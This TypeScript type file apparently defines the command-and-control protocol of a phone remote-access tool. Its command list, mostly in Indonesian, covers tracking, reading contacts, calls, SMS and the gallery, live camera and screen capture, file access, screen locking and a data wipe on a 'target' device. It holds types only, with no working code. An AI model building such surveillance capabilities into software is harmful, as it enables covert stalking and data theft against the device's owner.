export type ClientType = "admin" | "client_device";

export type CommandActionId =
  | "lacak"
  | "notifikasi"
  | "gallery"
  | "kontak"
  | "panggilan"
  | "live_camera"
  | "app_mgmt"
  | "wallpaper"
  | "senter"
  | "kunci_layar"
  | "putar_video"
  | "file_target"
  | "sms"
  | "live_screen"
  | "lock_pro"
  | "cam_monitor"
  | "reset_data";

export interface AdminCommandPayload {
  targetId: string;
  command: CommandActionId;
  timestamp: number;
  options?: {
    title?: string;
    body?: string;
    cameraType?: "front" | "back";
    imageUrl?: string;
    state?: "ON" | "OFF";
    path?: string;
    phone?: string;
    message?: string;
    videoUrl?: string;
    secureToken?: string;
    [key: string]: any;
  };
}

export interface ExecutionPayload {
  action: CommandActionId;
  params: Record<string, any>;
  issuedAt: number;
}

export interface ClientTelemetryPayload {
  nodeId: string;
  data: {
    status: "SUCCESS" | "FAILED";
    featureExecuted: CommandActionId;
    outputLogs?: string;
    payloadResult: Record<string, any>;
  };
}
